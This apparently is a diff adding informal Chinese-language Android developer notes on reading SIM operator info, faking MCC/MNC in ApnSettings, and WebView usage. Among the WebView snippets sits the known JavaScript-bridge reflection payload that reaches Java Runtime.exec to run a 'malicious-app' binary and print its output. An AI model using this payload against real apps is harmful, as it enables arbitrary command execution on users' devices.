@@ -1,0 +1,91 @@
+    1.如何获取SIM卡运营商的名称？？？
+
+    解决：
+    List<SIMInfo> simList = SIMInfo.getInsertedSIMList(getActivity());
+    for(SIMInfo simInfo:simList){
+        System.out.println("displayName:"+simInfo.mDisplayName);
+    }
+
+    2.如何在ApnSettings.java中获取SIM卡的信息？？？
+
+    解决：
+    if (FeatureOption.MTK_GEMINI_SUPPORT) {
+        mSimId = getIntent().getIntExtra("simId", SIM_CARD_UNDEFINED);
+    } else {
+        mSimId = SIM_CARD_SINGLE;
+    }
+    SIMInfo siminfo = SIMInfo.getSIMInfoBySlot(this, mSimId);        //根据mSimId获取sim卡的信息
+    if(siminfo!=null){
+        android.widget.Toast.makeText(ApnSettings.this,"displayName:"+siminfo.mDisplayName,2000).show();
+    }
+
+    3.如何模拟sim卡的mcc和mnc????
+
+    解决：
+    只要在ApnSettings.java文件中的 initSimState() 方法的最下面添加一行代码 mNumeric = "21403";就可以模拟了
+选择不了默认apn之前的apn？？？？？？？？？？？？？？
+
+4.webView application?????????
+
+WebView.loadUrl("file:///android_res/drawable/logo.png");
+
+String data = "<!DOCTYPE html>";
+data += "<head><title>Hello World</title></head>";
+data += "<body>Welcome to the WebView</body>";
+data += "</html>";
+// args: data, mimeType, encoding
+WebView.loadData(data, "text/html", "UTF-8");
+
+
+String html = loadFileFromSDCard("file:///sdcard/oreilly/book/logo.png");
+WebView.loadDataWithBaseURL("", html, "text/html", "UTF-8", null);
+
+
+<html>
+    <head>
+        <title>Playing Flash movie</title>
+    </head>
+    <body>
+        <object width="200" height="200">
+        <param name="movie" value="hybrid.swf">
+        <embed src="file:///sdcard/hybrid.swf" width="200" height="200"></embed>        //???????
+    </object>
+    </body>
+</html>
+
+
+WebView.loadData(getRawFileFromResource(R.raw.home), "text/html", "UTF-8");
+private String getRawFileFromResource(int resourceId) {
+    StringBuilder sb = new StringBuilder();
+    Scanner s = new Scanner(getResources().openRawResource(resourceId));
+    while (s.hasNextLine()) {
+        sb.append(s.nextLine() + "\n");
+    }
+    return sb.toString();
+}
+
+
+String js = "alert('Alert from Java');";
+WebView.loadUrl("JavaScript:" + js);
+
+function execute(cmdArgs) {
+    boundObj.getClass().forName("Java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+}
+var p = execute(["/data/data/com.yourapp/malicious-app"]);
+document.write(getContents(p.getInputStream()));
+
+@Override
+public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
+    if (url.contains(".js")) {
+        String str = "alert('This is a replaced JavaScript code.')";
+        InputStream is = null;
+        try {
+            is = new ByteArrayInputStream(str.getBytes("UTF8"));
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        }
+        String type = "application/JavaScript";
+        return new WebResourceResponse(type, "UTF-8", is);
+    }
+    return super.shouldInterceptRequest(view, url);
+}
